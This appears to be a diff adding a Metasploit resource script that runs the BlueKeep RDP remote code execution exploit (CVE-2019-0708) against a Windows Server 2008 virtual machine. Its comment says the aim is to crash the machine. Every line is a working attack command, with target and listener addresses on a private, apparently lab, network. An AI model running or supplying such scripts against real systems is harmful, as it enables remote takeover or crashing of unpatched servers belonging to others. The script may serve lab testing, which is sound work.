@@ -1,0 +1,6 @@
+#This script crashes a Windows Server 2008 VM using bluekeep
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS 192.168.56.10
+set LHOST 192.168.56.124
+set target 2
+exploit
